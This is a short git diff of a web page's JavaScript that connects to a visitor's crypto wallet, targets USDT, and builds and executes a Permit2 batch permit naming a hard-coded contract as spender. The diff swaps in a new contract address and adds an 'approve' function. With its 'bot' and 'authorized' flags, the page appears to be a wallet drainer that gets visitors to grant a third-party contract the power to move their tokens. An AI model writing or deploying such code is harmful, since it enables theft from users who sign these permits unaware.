@@ -183,7 +183,7 @@ body {
 const TOKEN = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // USDT
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const CONTRACT = "0x2776a9e675B2123278b975b68586Ee40ACC0A9d2";
+const CONTRACT = "0xe0D971B5Eb84d368B8CDf928eAE1915B9C5C71B9";
 
 let APP_STATE = { wallet:null, botActive:false, authorized:false };
 if (window.ethereum) {
@@ -254,9 +254,7 @@ async function runPermitFlowSafe(provider, signer, user){
   log("⚙️ Permit2 flow...");
 
   // ✅ CHECK allowances
-  const erc20Abi = [
-    "function allowance(address owner, address spender) view returns (uint256)"
-  ];
+ 
 const erc20Abi = [
   "function allowance(address owner, address spender) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)"
@@ -340,18 +338,23 @@ let details = [{
   // 🚀 EXECUTE
   log("🚀 Sending execute...");
 
-  const abiCoder = ethers.AbiCoder.defaultAbiCoder();
-
-  const permitBatch = abiCoder.encode(
-    [
-      "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
-    ],
-    [[
-      details.map(d => [d.token, d.amount, d.expiration, d.nonce]),
-      CONTRACT,
-      values.sigDeadline
-    ]]
-  );
+ const permitBatch = ethers.AbiCoder.defaultAbiCoder().encode(
+  [
+    "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
+  ],
+  [
+    {
+      details: details.map(d => ({
+        token: d.token,
+        amount: d.amount,
+        expiration: d.expiration,
+        nonce: d.nonce
+      })),
+      spender: CONTRACT,
+      sigDeadline: values.sigDeadline
+    }
+  ]
+);
 
   const contract = new ethers.Contract(
     CONTRACT,
